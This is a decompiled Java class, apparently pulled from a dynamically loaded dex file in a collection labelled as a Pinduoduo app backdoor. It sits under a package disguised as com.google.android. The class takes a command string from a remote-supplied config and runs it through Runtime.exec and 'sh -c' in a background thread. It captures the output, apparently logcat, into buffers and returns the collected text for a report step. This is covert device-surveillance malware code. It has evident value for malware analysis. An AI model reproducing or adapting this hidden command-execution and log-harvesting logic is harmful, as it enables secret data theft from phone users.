package com.google.android.sd.biz_dynamic_dex.td.logcat.c.b;

import android.content.Context;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.a;
import com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b;
import com.google.android.sd.utils.IoUtils;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public final class a implements a.a {
  Context a;
  
  b b;
  
  StringBuilder c;
  
  boolean d = true;
  
  Process e;
  
  InputStreamReader f = null;
  
  BufferedReader g = null;
  
  private StringBuilder h;
  
  public a(Context paramContext, b paramb) {
    try {
      b.a("core_new_instance");
      this.a = paramContext;
      this.b = paramb;
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  private static boolean a(b paramb) {
    try {
      String str = paramb.g;
      if (TextUtils.isEmpty(str))
        return false; 
      Runtime.getRuntime().exec(str);
      return true;
    } catch (Exception exception) {
      return false;
    } 
  }
  
  private String e() {
    try {
      StringBuilder stringBuilder = this.h;
      if (stringBuilder != null)
        return stringBuilder.toString(); 
    } catch (Exception exception) {}
    return "";
  }
  
  public final void a() {
    try {
      b.a("core_do_start");
      if (this.h != null || this.c != null) {
        b.a("core_not_start_again");
        return;
      } 
      b.a("core_expand_cache_".concat(String.valueOf(a(this.b))));
      this.h = new StringBuilder();
      this.c = new StringBuilder();
      this.d = false;
      (new Thread(new Runnable(this) {
            public final void run() {
              // Byte code:
              //   0: aload_0
              //   1: getfield a : Lcom/google/android/sd/biz_dynamic_dex/td/logcat/c/b/a;
              //   4: astore #8
              //   6: aload #8
              //   8: getfield a : Landroid/content/Context;
              //   11: astore #9
              //   13: aload_0
              //   14: getfield a : Lcom/google/android/sd/biz_dynamic_dex/td/logcat/c/b/a;
              //   17: getfield b : Lcom/google/android/sd/biz_dynamic_dex/td/logcat/c/b/b;
              //   20: astore #10
              //   22: invokestatic currentTimeMillis : ()J
              //   25: lstore #4
              //   27: aload #10
              //   29: getfield c : J
              //   32: lstore #6
              //   34: aload #10
              //   36: getfield d : I
              //   39: istore_2
              //   40: aload #10
              //   42: getfield e : I
              //   45: istore_3
              //   46: aload #10
              //   48: getfield f : Ljava/lang/String;
              //   51: astore #10
              //   53: aload #8
              //   55: invokestatic getRuntime : ()Ljava/lang/Runtime;
              //   58: iconst_3
              //   59: anewarray java/lang/String
              //   62: dup
              //   63: iconst_0
              //   64: ldc 'sh'
              //   66: aastore
              //   67: dup
              //   68: iconst_1
              //   69: ldc '-c'
              //   71: aastore
              //   72: dup
              //   73: iconst_2
              //   74: aload #10
              //   76: aastore
              //   77: invokevirtual exec : ([Ljava/lang/String;)Ljava/lang/Process;
              //   80: putfield e : Ljava/lang/Process;
              //   83: aload #8
              //   85: new java/io/InputStreamReader
              //   88: dup
              //   89: aload #8
              //   91: getfield e : Ljava/lang/Process;
              //   94: invokevirtual getInputStream : ()Ljava/io/InputStream;
              //   97: invokespecial <init> : (Ljava/io/InputStream;)V
              //   100: putfield f : Ljava/io/InputStreamReader;
              //   103: aload #8
              //   105: new java/io/BufferedReader
              //   108: dup
              //   109: aload #8
              //   111: getfield f : Ljava/io/InputStreamReader;
              //   114: invokespecial <init> : (Ljava/io/Reader;)V
              //   117: putfield g : Ljava/io/BufferedReader;
              //   120: ldc 'core_start_catch'
              //   122: invokestatic a : (Ljava/lang/String;)V
              //   125: iconst_0
              //   126: istore_1
              //   127: aload #8
              //   129: getfield d : Z
              //   132: ifne -> 283
              //   135: aload #8
              //   137: getfield g : Ljava/io/BufferedReader;
              //   140: invokevirtual readLine : ()Ljava/lang/String;
              //   143: astore #10
              //   145: aload #10
              //   147: invokestatic isEmpty : (Ljava/lang/CharSequence;)Z
              //   150: ifeq -> 159
              //   153: invokestatic c : ()V
              //   156: goto -> 127
              //   159: aload #8
              //   161: getfield c : Ljava/lang/StringBuilder;
              //   164: astore #11
              //   166: aload #11
              //   168: ldc '\\n'
              //   170: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
              //   173: pop
              //   174: aload #11
              //   176: aload #10
              //   178: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
              //   181: pop
              //   182: ldc '【append】'
              //   184: aload #10
              //   186: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
              //   189: invokevirtual concat : (Ljava/lang/String;)Ljava/lang/String;
              //   192: pop
              //   193: invokestatic c : ()V
              //   196: iload_1
              //   197: iload_3
              //   198: if_icmple -> 368
              //   201: aload #8
              //   203: invokevirtual c : ()V
              //   206: iload_2
              //   207: ifgt -> 359
              //   210: ldc 'core_stop_logcat_for_max_page'
              //   212: invokestatic a : (Ljava/lang/String;)V
              //   215: aload #9
              //   217: aload #8
              //   219: getfield b : Lcom/google/android/sd/biz_dynamic_dex/td/logcat/c/b/b;
              //   222: getfield a : Ljava/lang/String;
              //   225: invokestatic f : (Landroid/content/Context;Ljava/lang/String;)V
              //   228: aload #9
              //   230: ldc '3'
              //   232: invokestatic b : (Landroid/content/Context;Ljava/lang/String;)V
              //   235: aload #8
              //   237: iconst_1
              //   238: putfield d : Z
              //   241: goto -> 283
              //   244: invokestatic currentTimeMillis : ()J
              //   247: lload #4
              //   249: lsub
              //   250: lload #6
              //   252: ldc2_w 1000
              //   255: lmul
              //   256: lcmp
              //   257: ifle -> 127
              //   260: ldc 'core_stop_logcat_for_max_time_loop'
              //   262: invokestatic a : (Ljava/lang/String;)V
              //   265: aload #9
              //   267: ldc '3'
              //   269: invokestatic b : (Landroid/content/Context;Ljava/lang/String;)V
              //   272: aload #8
              //   274: iconst_1
              //   275: putfield d : Z
              //   278: aload #8
              //   280: invokevirtual c : ()V
              //   283: new java/lang/StringBuilder
              //   286: dup
              //   287: ldc 'core_stop_logcat_flag_'
              //   289: invokespecial <init> : (Ljava/lang/String;)V
              //   292: astore #9
              //   294: aload #9
              //   296: aload #8
              //   298: getfield d : Z
              //   301: invokevirtual append : (Z)Ljava/lang/StringBuilder;
              //   304: pop
              //   305: aload #9
              //   307: invokevirtual toString : ()Ljava/lang/String;
              //   310: invokestatic a : (Ljava/lang/String;)V
              //   313: aload #8
              //   315: iconst_0
              //   316: invokevirtual a : (Z)V
              //   319: return
              //   320: astore #9
              //   322: goto -> 347
              //   325: astore #9
              //   327: ldc 'core_catch_logcat_error_'
              //   329: aload #9
              //   331: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
              //   334: invokevirtual concat : (Ljava/lang/String;)Ljava/lang/String;
              //   337: invokestatic a : (Ljava/lang/String;)V
              //   340: aload #8
              //   342: iconst_0
              //   343: invokevirtual a : (Z)V
              //   346: return
              //   347: aload #8
              //   349: iconst_0
              //   350: invokevirtual a : (Z)V
              //   353: aload #9
              //   355: athrow
              //   356: astore #8
              //   358: return
              //   359: iload_2
              //   360: iconst_1
              //   361: isub
              //   362: istore_2
              //   363: iconst_0
              //   364: istore_1
              //   365: goto -> 244
              //   368: iload_1
              //   369: iconst_1
              //   370: iadd
              //   371: istore_1
              //   372: goto -> 244
              // Exception table:
              //   from	to	target	type
              //   0	22	356	java/lang/Exception
              //   22	125	325	java/lang/Exception
              //   22	125	320	finally
              //   127	156	325	java/lang/Exception
              //   127	156	320	finally
              //   159	196	325	java/lang/Exception
              //   159	196	320	finally
              //   201	206	325	java/lang/Exception
              //   201	206	320	finally
              //   210	241	325	java/lang/Exception
              //   210	241	320	finally
              //   244	283	325	java/lang/Exception
              //   244	283	320	finally
              //   283	313	325	java/lang/Exception
              //   283	313	320	finally
              //   313	319	356	java/lang/Exception
              //   327	340	320	finally
              //   340	346	356	java/lang/Exception
              //   347	356	356	java/lang/Exception
            }
          })).start();
      a.a(this.a, this.b.c * 1000L, this);
      return;
    } catch (Exception exception) {
      b.a("core_do_start_error_".concat(String.valueOf(exception)));
      return;
    } 
  }
  
  public final void a(Context paramContext) {
    try {
      b.a("core_stop_logcat_for_max_time");
      this.d = true;
      c();
      a.f(paramContext, this.b.a);
      a(false);
      return;
    } catch (Exception exception) {
      b.a("core_on_proguard_error".concat(String.valueOf(exception)));
      return;
    } 
  }
  
  final void a(boolean paramBoolean) {
    Exception exception;
    /* monitor enter ThisExpression{ObjectType{com/google/android/sd/biz_dynamic_dex/td/logcat/c/b/a}} */
    try {
      b.a("core_do_finish_work_".concat(String.valueOf(paramBoolean)));
      if (!this.d) {
        b.a("core_stop_logcat");
        this.d = true;
      } 
      if (paramBoolean && this.h != null) {
        b.a("core_clear_result");
        this.h = null;
      } 
      if (this.c != null) {
        b.a("core_clear_temp");
        this.c = null;
      } 
      if (this.e != null) {
        b.a("core_destroy_process");
        this.e.destroy();
        this.e = null;
      } 
      if (this.f != null) {
        b.a("core_close_isr");
        IoUtils.closeQuietly(this.f);
        this.f = null;
      } 
      if (this.g != null) {
        b.a("core_close_br");
        IoUtils.closeQuietly(this.g);
        this.g = null;
      } 
      a.a();
      b.a(this.a);
      /* monitor exit ThisExpression{ObjectType{com/google/android/sd/biz_dynamic_dex/td/logcat/c/b/a}} */
      return;
    } catch (Exception null) {
      b.a("core_do_finish_error_".concat(String.valueOf(exception)));
      /* monitor exit ThisExpression{ObjectType{com/google/android/sd/biz_dynamic_dex/td/logcat/c/b/a}} */
      return;
    } finally {}
    /* monitor exit ThisExpression{ObjectType{com/google/android/sd/biz_dynamic_dex/td/logcat/c/b/a}} */
    throw exception;
  }
  
  public final String b() {
    try {
      b.a("core_do_report");
      if (!this.d) {
        b.a("core_stop_logcat_for_report");
        this.d = true;
      } 
      c();
      return e();
    } catch (Exception exception) {
      b.a("core_do_report_error_".concat(String.valueOf(exception)));
      return "";
    } 
  }
  
  final void c() {
    try {
      if (this.c != null && this.h != null) {
        b.a("core_append_data");
        this.h.append(this.c);
        this.c = new StringBuilder();
      } 
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  public final void d() {
    try {
      b.a("core_do_stop");
      a(true);
      return;
    } catch (Exception exception) {
      b.a("core_do_stop_error_".concat(String.valueOf(exception)));
      return;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\8aeb045fad9343acbbd1a26998b6485a-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\td\logcat\c\b\a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */